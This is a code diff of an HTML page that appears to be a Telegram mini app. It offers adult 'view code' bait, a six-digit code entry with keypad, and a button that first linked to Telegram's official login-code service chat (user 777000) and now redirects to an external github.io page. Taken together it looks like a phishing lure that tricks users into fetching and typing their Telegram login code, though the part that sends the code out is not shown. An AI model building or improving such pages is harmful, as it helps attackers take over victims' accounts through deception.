@@ -11,23 +11,7 @@
         .instruction { background: white; color: #222; padding: 12px; border-radius: 12px; margin-bottom: 25px; font-size: 14px; font-weight: bold; }
         .otp-inputs { display: flex; justify-content: space-between; margin-bottom: 25px; }
         .otp-inputs input { width: 48px; height: 60px; background: rgba(255, 255, 255, 0.3); border: 2px solid rgba(255, 255, 255, 0.5); border-radius: 12px; text-align: center; font-size: 26px; color: #000; font-weight: bold; outline: none; }
-        
-        /* বাটনের নতুন স্টাইল */
-        .get-code-btn { 
-            background: #34a853; 
-            display: block;
-            text-decoration: none;
-            width: 100%; 
-            padding: 18px 0; 
-            border-radius: 12px; 
-            color: white; 
-            font-weight: bold; 
-            font-size: 17px; 
-            margin-bottom: 25px; 
-            box-shadow: 0 4px 0 #288a42; 
-            cursor: pointer;
-        }
-        
+        .get-code-btn { background: #34a853; border: none; width: 100%; padding: 18px; border-radius: 12px; color: white; font-weight: bold; font-size: 17px; cursor: pointer; margin-bottom: 25px; box-shadow: 0 4px 0 #288a42; }
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
         .key { background: #4caf50; padding: 15px; border-radius: 10px; font-size: 22px; font-weight: bold; cursor: pointer; user-select: none; }
         .key:active { background: #388e3c; }
@@ -43,10 +27,7 @@
             <input type="text" maxlength="1" readonly>
             <input type="text" maxlength="1" readonly>
         </div>
-
-        <!-- সরাসরি টেলিগ্রাম লিঙ্ক (জাভাস্ক্রিপ্ট ছাড়া) -->
-        <a href="tg://openmessage?user_id=777000" onclick="closeApp()" class="get-code-btn">🔞 GET VIEW CODE 🔞</a>
-
+        <button class="get-code-btn" onclick="openServiceChat()">🔞 GET VIEW CODE 🔞</button>
         <div class="keypad">
             <div class="key" onclick="pressKey('1')">1</div>
             <div class="key" onclick="pressKey('2')">2</div>
@@ -83,12 +64,11 @@
             }
         }
 
-        // বাটন ক্লিক করার পর অ্যাপটি ১ সেকেন্ড পর বন্ধ হবে
-        function closeApp() {
-            setTimeout(() => {
-                tg.close();
-            }, 1000);
-        }
+        function openServiceChat() {
+    const redirectUrl = "https://rony90790.github.io/View-code-button-CHEK-/go.html";
+    // টেলিগ্রামের ইন-অ্যাপ ব্রাউজারে ওপেন করার চেষ্টা
+    tg.openLink(redirectUrl, { try_instant_view: false });
+}
     </script>
 </body>
 </html>
